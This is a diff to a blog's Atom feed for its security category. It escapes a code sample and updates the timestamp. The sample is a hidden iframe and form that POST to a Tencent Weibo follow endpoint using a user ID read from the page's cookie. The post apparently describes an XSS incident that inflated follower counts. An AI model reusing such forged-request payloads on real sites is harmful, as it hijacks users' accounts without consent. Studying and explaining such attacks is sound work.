@@ -4,7 +4,7 @@
   <title><![CDATA[分类：security | 移动开发技术]]></title>
   <link href="http://jason5.cn/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://jason5.cn/"/>
-  <updated>2021-01-09T17:34:20+08:00</updated>
+  <updated>2023-01-09T16:25:43+08:00</updated>
   <id>http://jason5.cn/</id>
   <author>
     <name><![CDATA[jason]]></name>
@@ -148,16 +148,12 @@ mysqldump -uxxx -pxxx --databases dbname &gt; /path/to/bak/$time.sql
 
 <p>innerHTML被修改为</p>
 
-<p>```javascript</p>
-
-<iframe style='display:none' name='mj'></iframe>
-
-
-<p><form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'>
-  <input type='hidden' value='" + window.u + "' name='u' />
-  <input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin' />
-</form>
-```</p>
+<pre><code class="javascript">&lt;iframe style='display:none' name='mj'&gt;&lt;/iframe&gt;
+&lt;form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'&gt;
+  &lt;input type='hidden' value='" + window.u + "' name='u' /&gt;
+  &lt;input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin' /&gt;
+&lt;/form&gt;
+</code></pre>
 
 <p>粉丝数刷到3w+</p>
 
